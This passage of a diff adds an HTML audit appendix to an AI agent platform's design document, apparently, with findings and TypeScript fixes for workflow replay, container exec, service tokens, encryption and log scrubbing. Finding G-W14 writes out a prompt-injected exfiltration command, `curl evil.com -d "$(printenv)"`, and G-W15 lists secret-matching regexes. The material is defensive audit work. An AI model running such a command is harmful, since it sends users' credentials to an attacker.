@@ -49117,6 +49117,1010 @@ const rows = [...this.ctx.storage.sql.exec(
 Fuse these BM25 results with the vector results via reciprocal rank fusion for hybrid search.</p></div>
 </div>
 
+
+
+<section id="appendix-w" style="margin-top:80px;">
+<h2 style="font-family:'Fraunces',serif;font-size:32px;font-weight:700;color:var(--hd);letter-spacing:-.02em;margin:0 0 6px;">Appendix W — Fifteenth Pass</h2>
+<p style="font-family:'DM Mono',monospace;font-size:11px;color:var(--or);letter-spacing:.1em;text-transform:uppercase;margin:0 0 32px;">Workflows Determinism · Container Internals · Secrets &amp; Encryption · Email/File Inputs · Orchestration &amp; State · Migrations &amp; Deployment</p>
+<div id="G-W01" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W01</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Workflows — Determinism — VerticalFinetuneWorkflow / replay</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Date.now() and randomUUID() called outside step.do() — replay creates duplicate files and inconsistent IDs</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The fine-tune workflow computes a training file path as `bootstrap/${vertical}/training-runs/${Date.now()}/train.jsonl` and a model description outside any `step.do()` callback. CF Workflows replays all code outside step boundaries on every continuation (after a failure, a sleep, or a hibernation). Because `Date.now()` and `crypto.randomUUID()` are non-deterministic, each replay produces a different path and ID, so the workflow writes duplicate training files to R2 and references a model version string that no longer matches the one persisted by an earlier step.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Move all non-deterministic values inside a step so they are computed once and memoized:
+```typescript
+const runId = await step.do("allocate-run-id", async () =&gt; {
+  return { id: crypto.randomUUID(), at: Date.now() };
+});
+const trainingPath = `bootstrap/${vertical}/training-runs/${runId.id}/train.jsonl`;
+// runId is now stable across all replays because step.do() persists its return value
+```
+Rule: any `Date.now()`, `crypto.randomUUID()`, `Math.random()`, or `fetch()` MUST live inside a `step.do()` so its result is captured in the workflow journal and replayed identically.</p></div>
+</div>
+<div id="G-W02" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W02</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Workflows — Limits — VerticalFinetuneWorkflow / step return size</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Aggregation step returns the full training set inline — exceeds the step-result size limit and bloats the journal</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The `aggregate-training-data` step reads all labeled examples from R2 into an array, serializes them to JSONL, and returns `{ trainingPath, exampleCount }` — but the implementation collects the entire example set with no cap, and the formatted JSONL is held in the step closure. CF Workflows persists every step return value into the workflow journal; large returns blow past the per-step result size limit (single-digit MB) and bloat the journal, slowing every subsequent replay. A few thousand examples is enough to trip this.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Stream the data to R2 inside the step and return only a pointer:
+```typescript
+const result = await step.do("aggregate-training-data", async () =&gt; {
+  const path = `bootstrap/${vertical}/training-runs/${runId}/train.jsonl`;
+  // Write directly to R2; never return the payload itself
+  await streamExamplesToR2(env.NAELAO_WORKSPACE, path, exampleSource);
+  const count = await countLines(env.NAELAO_WORKSPACE, path);
+  return { trainingPath: path, exampleCount: count }; // small, safe to journal
+});
+```
+Step returns should always be small references (paths, IDs, counts), never bulk data.</p></div>
+</div>
+<div id="G-W03" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W03</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Workflows — Limits — VerticalFinetuneWorkflow / step budget</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Polling loop has no max-iteration guard — a slow training job can exceed the 1000-step hard limit</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The job-monitoring loop is `while (jobStatus === "running") { step.sleep("30 minutes"); step.do("check-status"); }`. Each iteration consumes two steps. A fine-tune job that runs for 24+ hours produces ~96 iterations (~192 steps), and a stuck provider job that never transitions out of "running" loops indefinitely toward the 1000-step hard ceiling, at which point the workflow is force-terminated with no clean failure state.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Bound the poll loop with an explicit iteration cap and a wall-clock deadline:
+```typescript
+const MAX_POLLS = 96;          // 48 hours at 30-min intervals
+const DEADLINE = startTime + 48 * 3600_000;
+for (let i = 0; i &lt; MAX_POLLS; i++) {
+  const status = await step.do(`check-status-${i}`, () =&gt; pollProvider(jobId));
+  if (status !== "running") break;
+  if (Date.now() &gt; DEADLINE) {
+    await step.do("mark-timed-out", () =&gt; markJobFailed(jobId, "timeout"));
+    break;
+  }
+  await step.sleep(`poll-${i}`, "30 minutes");
+}
+```
+Use exponential backoff on the sleep interval to reduce total step count for long jobs.</p></div>
+</div>
+<div id="G-W04" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W04</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Containers — Concurrency — AssistantSandboxDO / exec serialization</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Concurrent exec() calls hit the same container shell without serialization — interleaved output and state corruption</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The SandboxDO's `exec()` dispatches directly to `this.containerRef.exec()` with no command queue. When two requests run in parallel (e.g., a workspace tool and a sandbox tool in the same turn), both execute against the same container shell concurrently. Their stdout/stderr interleave, working-directory changes from one command bleed into the other, and any shared file (a temp file, a lock) races. The DO's single-threaded request model does NOT protect this, because `exec()` is a non-storage async call that does not hold the input gate.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Serialize commands through a per-DO queue:
+```typescript
+private execChain: Promise&lt;unknown&gt; = Promise.resolve();
+async exec(cmd: string, args: string[], opts: ExecOpts): Promise&lt;ExecResult&gt; {
+  // Chain each exec after the previous one completes
+  const run = this.execChain.then(() =&gt; this.containerRef!.exec(cmd, args, opts));
+  // Keep the chain alive even if one command throws
+  this.execChain = run.catch(() =&gt; {});
+  return run;
+}
+```
+For commands that are genuinely independent and safe to parallelize, run them in separate working directories or separate containers (see multi-container, Appendix T).</p></div>
+</div>
+<div id="G-W05" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W05</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Containers — Lifecycle — AssistantSandboxDO / boot race</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">ensureRunning() is not atomic — two simultaneous calls boot two containers</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">`ensureRunning()` checks `if (status === "running" &amp;&amp; this.containerRef) return` and otherwise calls `getSandbox()`. The check and the boot are not atomic across the two non-storage async awaits, so two requests arriving on a cold DO both observe `stopped`, both call `getSandbox()`, and two container instances are provisioned. The second leaks (it is never tracked or terminated) and bills until its idle timeout.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Guard the boot with blockConcurrencyWhile and a single in-flight promise:
+```typescript
+private booting: Promise&lt;Sandbox&gt; | null = null;
+async ensureRunning(): Promise&lt;Sandbox&gt; {
+  if (this.containerRef &amp;&amp; await this.isAlive(this.containerRef)) return this.containerRef;
+  if (this.booting) return this.booting; // coalesce concurrent boots
+  this.booting = (async () =&gt; {
+    const sb = getSandbox(this.env.SANDBOX, this.sandboxId);
+    await sb.startup?.();
+    this.containerRef = sb;
+    return sb;
+  })();
+  try { return await this.booting; } finally { this.booting = null; }
+}
+```</p></div>
+</div>
+<div id="G-W06" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W06</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Containers — Lifecycle — AssistantSandboxDO / idle alarm</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Idle-termination alarm is reset only after exec() completes — a long command is killed mid-execution</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The idle-timeout alarm (e.g., 10 minutes) is refreshed by `resetIdleTimer()`, which is called only at the END of `exec()`. A single command that runs longer than the idle window — a 15-minute Python training script, a long build — does not refresh the timer while it runs, so the alarm fires and terminates the container while the command is still executing, killing the job with no result.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Refresh the deadline at command start and use a heartbeat for long commands:
+```typescript
+async exec(cmd: string, args: string[], opts: ExecOpts) {
+  await this.ctx.storage.put("last_active", Date.now());
+  await this.ctx.storage.setAlarm(Date.now() + IDLE_MS); // arm before running
+  // Heartbeat: while the command runs, keep pushing the deadline out
+  const hb = setInterval(() =&gt; this.ctx.storage.setAlarm(Date.now() + IDLE_MS), IDLE_MS / 3);
+  try {
+    return await this.containerRef!.exec(cmd, args, opts);
+  } finally {
+    clearInterval(hb);
+    await this.ctx.storage.setAlarm(Date.now() + IDLE_MS);
+  }
+}
+```
+In the alarm handler, only terminate if `now - last_active &gt; IDLE_MS` AND no command is in flight.</p></div>
+</div>
+<div id="G-W07" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W07</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Containers — Output — AssistantSandboxDO / output truncation</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">exec() truncates stdout/stderr silently — the agent proceeds on incomplete output with no truncated flag</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Command output is truncated with `.slice()` to ~10,000 bytes (stdout) and ~5,000 bytes (stderr) before being returned/logged. The truncation is silent: there is no `truncated: true` flag and no indication to the agent that the tail of the output was discarded. A command whose meaningful result is at the end (a build summary, a test report's final lines, a JSON payload) returns a head that looks complete, and the agent reasons over partial data.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Signal truncation and promote large output to R2:
+```typescript
+async function captureOutput(raw: string, kind: "stdout"|"stderr") {
+  const LIMIT = kind === "stdout" ? 10_000 : 5_000;
+  if (raw.length &lt;= LIMIT) return { text: raw, truncated: false };
+  // Persist the full output, return head + tail + a reference
+  const ref = `tmp/exec-output/${crypto.randomUUID()}.txt`;
+  await env.NAELAO_WORKSPACE.put(ref, raw);
+  return {
+    text: raw.slice(0, LIMIT / 2) + "\n…[truncated]…\n" + raw.slice(-LIMIT / 2),
+    truncated: true,
+    fullOutputRef: ref,
+  };
+}
+```
+The agent can then fetch `fullOutputRef` if it needs the complete output.</p></div>
+</div>
+<div id="G-W08" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W08</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Containers — Lifecycle — AssistantSandboxDO / command timeout</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">exec() has no per-command timeout — a hung process holds the container indefinitely</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The `exec()` call passes no timeout to the container runtime. A command that hangs — a Python script blocked on an unresponsive external API, a `read` waiting on stdin that never comes, an infinite loop — occupies the container forever (or until the idle alarm, which the in-flight command keeps resetting per G-W06). The agent turn that issued it blocks, and the container cannot service other commands.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Enforce a per-command timeout with a SIGTERM/SIGKILL escalation:
+```typescript
+async exec(cmd: string, args: string[], opts: ExecOpts &amp; { timeoutMs?: number }) {
+  const timeoutMs = opts.timeoutMs ?? 120_000; // 2 min default
+  const exec = this.containerRef!.exec(cmd, args, opts);
+  const timeout = new Promise&lt;never&gt;((_, rej) =&gt;
+    setTimeout(() =&gt; rej(new Error(`exec timeout after ${timeoutMs}ms`)), timeoutMs));
+  try {
+    return await Promise.race([exec, timeout]);
+  } catch (e) {
+    // Best-effort kill so the container is reusable
+    await this.containerRef!.exec("pkill", ["-TERM", "-f", cmd], {}).catch(() =&gt; {});
+    throw e;
+  }
+}
+```
+Expose `timeoutMs` per tool so long jobs can opt into a larger budget explicitly.</p></div>
+</div>
+<div id="G-W09" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W09</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#10B981;background:#10B98118;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">LOW</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Containers — Lifecycle — AssistantSandboxDO / crash detection</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">A crashed container leaves a stale containerRef and DB status of running — next exec() fails opaquely</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">If the container process dies (OOM kill, SIGKILL, host reclaim), `this.containerRef` still holds a reference to the dead stub and the DB row still reads `status = "running"`. The next `exec()` call dispatches to the dead stub and fails with an opaque connection error rather than transparently rebooting. The DO never reconciles the discrepancy on its own.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Detect connection failures and self-heal:
+```typescript
+async exec(cmd: string, args: string[], opts: ExecOpts) {
+  try {
+    return await this.containerRef!.exec(cmd, args, opts);
+  } catch (e) {
+    if (isConnectionError(e)) {
+      this.containerRef = null;
+      this.ctx.storage.sql.exec("UPDATE sandbox SET status='stopped' WHERE id=?", this.sandboxId);
+      await this.ensureRunning(); // reboot
+      return await this.containerRef!.exec(cmd, args, opts); // retry once
+    }
+    throw e;
+  }
+}
+```</p></div>
+</div>
+<div id="G-W10" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W10</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#EF4444;background:#EF444418;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">CRITICAL</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — Service Auth — platform / NAELAO_INTERNAL_TOKEN</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Static shared NAELAO_INTERNAL_TOKEN for all inter-Worker calls — one compromised Worker exposes every space</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Inter-Worker calls across at least eight call sites authenticate with a single static `NAELAO_INTERNAL_TOKEN` shared by all Workers. It has no expiry, no per-request scope, and no caller identity. If any Worker is compromised — for example via a malicious dynamic tool or skill that achieves code execution in a Worker isolate — the attacker holds a token that authorizes calls to every internal API for every space, and nothing in the audit trail distinguishes the malicious calls from legitimate platform traffic.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Replace the static token with short-lived, caller-scoped service JWTs:
+```typescript
+// Caller mints a 5-minute JWT identifying itself and the target scope
+async function mintServiceToken(env: Env, caller: string, scope: string) {
+  return await signJWT({ iss: caller, aud: "naelao-internal", scope,
+    exp: Math.floor(Date.now()/1000) + 300 }, env.SERVICE_SIGNING_KEY);
+}
+// Callee verifies signature, issuer, audience, scope, and expiry
+const { payload } = await jwtVerify(token, key, {
+  audience: "naelao-internal", algorithms: ["HS256"],
+});
+if (!payload.scope?.includes(requiredScope)) return new Response("forbidden", { status: 403 });
+```
+Log `iss` (calling Worker) and `scope` on every internal call so compromised callers are attributable.</p></div>
+</div>
+<div id="G-W11" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W11</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — Encryption — naelao-credentials / key isolation</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Single platform key encrypts every space's credentials — no envelope encryption or per-tenant key</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The naelao-credentials Worker encrypts all stored MCP credentials, OAuth tokens, and BYOK API keys with one platform-level `NAELAO_MCP_ENCRYPTION_KEY`. There is no per-tenant data encryption key and no envelope encryption. A single compromise of that key (leaked secret, insider, misconfigured binding) instantly decrypts every customer's credentials across every space — there is no blast-radius containment.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Adopt envelope encryption with per-space data keys:
+```typescript
+// Per-space DEK, wrapped by the platform KEK
+async function encryptForSpace(plaintext: string, spaceId: string, env: Env) {
+  const dek = await deriveOrFetchDEK(spaceId, env);         // unique per space
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const ct = await aesGcmEncrypt(plaintext, dek, iv);
+  return { ciphertext: ct, iv, dekId: dek.id };             // store wrapped DEK separately
+}
+```
+Alternatively derive per-space keys with HKDF(platform_key, spaceId). Rotating one space's DEK then re-encrypts only that space, and a leaked DEK exposes only one tenant.</p></div>
+</div>
+<div id="G-W12" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W12</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — Encryption — naelao-credentials / AES-GCM IV</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">AES-GCM IV uniqueness not enforced or audited — nonce reuse under the same key is catastrophic</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Encryption uses `crypto.getRandomValues(new Uint8Array(12))` for the GCM IV, which is correct in isolation, but nothing audits or guarantees IV uniqueness per key over time. A bug in key rotation, a replay of an old encrypt path, or restoring backed-up rows that reuse an IV under the same key collapses AES-GCM security entirely: an attacker who obtains two ciphertexts encrypted with the same (key, IV) recovers the XOR of the plaintexts and can forge tags. There is no logging of IVs to detect a collision.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Make IV reuse structurally impossible and detectable:
+```typescript
+// Prefer a deterministic, monotonic counter-based IV per (key) to guarantee uniqueness,
+// or random IV + a uniqueness guard:
+const iv = crypto.getRandomValues(new Uint8Array(12));
+const ivHash = await sha256(concat(dekId, iv));
+const clash = [...sql.exec("SELECT 1 FROM iv_log WHERE iv_hash=?", ivHash)];
+if (clash.length) throw new Error("IV collision detected — aborting encrypt");
+sql.exec("INSERT INTO iv_log (iv_hash, dek_id, at) VALUES (?,?,?)", ivHash, dekId, Date.now());
+```
+Rotate the DEK well before the birthday bound (2^32 messages for random 96-bit IVs).</p></div>
+</div>
+<div id="G-W13" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W13</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — OAuth — naelao-credentials / token lifecycle</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Stored OAuth tokens have no expiry tracking or refresh — silent tool failures and no rotation on use</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">OAuth tokens for third-party MCP integrations (GitHub, Stripe, Notion) are stored encrypted but the schema has no `token_expires_at`, `refresh_token`, or `last_refreshed_at`. When an access token expires, the agent's tool call to that MCP server silently fails with a 401 and no refresh is attempted. For providers that rotate refresh tokens on use (RFC 6749 §6), the rotated token is never captured, so the integration permanently breaks after the first refresh elsewhere.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Track expiry and refresh proactively:
+```sql
+ALTER TABLE credentials ADD COLUMN token_expires_at INTEGER;
+ALTER TABLE credentials ADD COLUMN refresh_token_enc TEXT;  -- encrypted
+ALTER TABLE credentials ADD COLUMN last_refreshed_at INTEGER;
+```
+```typescript
+async function getValidToken(credId: string, env: Env) {
+  const c = await loadCredential(credId, env);
+  if (c.token_expires_at &amp;&amp; c.token_expires_at - Date.now() &lt; 24*3600_000) {
+    const refreshed = await refreshOAuth(c.provider, decrypt(c.refresh_token_enc));
+    await storeRefreshed(credId, refreshed); // capture rotated refresh token
+    return refreshed.access_token;
+  }
+  return decrypt(c.access_token_enc);
+}
+```</p></div>
+</div>
+<div id="G-W14" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W14</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — Containers — AssistantSandboxDO / env var exposure</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Credentials injected into containers as env vars — readable by any process via printenv or shell history</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Secrets (including the internal token and provider keys) are passed to the container through the `env:` object on `exec()`. Every process inside the container inherits these environment variables, so any agent-run command — or any user-authored skill script — can dump them with `printenv`, read `/proc/self/environ`, or find them in shell history. A single prompt-injected `curl evil.com -d "$(printenv)"` exfiltrates the entire credential set.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Never pass secrets as container env vars. Use a scoped credential-retrieval endpoint:
+```typescript
+// Container fetches a short-lived, request-scoped token from an internal endpoint
+// instead of receiving raw keys:
+//   GET http://credentials.internal/get?provider=stripe&amp;runId=...
+// returns a signed token valid for seconds, scoped to this run and provider.
+const token = await fetch(`http://credentials.internal/get?provider=${p}&amp;runId=${runId}`,
+  { headers: { "x-run-attestation": runAttestation } }).then(r =&gt; r.text());
+```
+If env injection is unavoidable, mount secrets as a read-only tmpfs file with restrictive permissions and clear them after the command, and disable shell history in the container.</p></div>
+</div>
+<div id="G-W15" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W15</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — Logging — platform / secret scrubbing</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No guaranteed scrubbing of secrets from error messages and logs</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">When an MCP tool call or credential operation fails, the error message frequently includes the request URL, headers, or response body — any of which may carry an API key, bearer token, or OAuth secret. These errors are logged and sometimes surfaced to the client. There is no central scrubbing layer that redacts secret-shaped strings before logging or returning errors, so credentials leak into log sinks (which may be retained and forwarded to third parties).</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Run all log/error output through a redactor:
+```typescript
+const SECRET_PATTERNS: RegExp[] = [
+  /[Bb]earer\s+[A-Za-z0-9._-]{20,}/g,
+  /sk-[A-Za-z0-9]{20,}/g,
+  /xox[baprs]-[A-Za-z0-9-]{10,}/g,        // Slack
+  /ghp_[A-Za-z0-9]{36}/g,                 // GitHub PAT
+  /(api[_-]?key|secret|token)["\s:=]+[A-Za-z0-9._-]{12,}/gi,
+];
+function scrub(s: string): string {
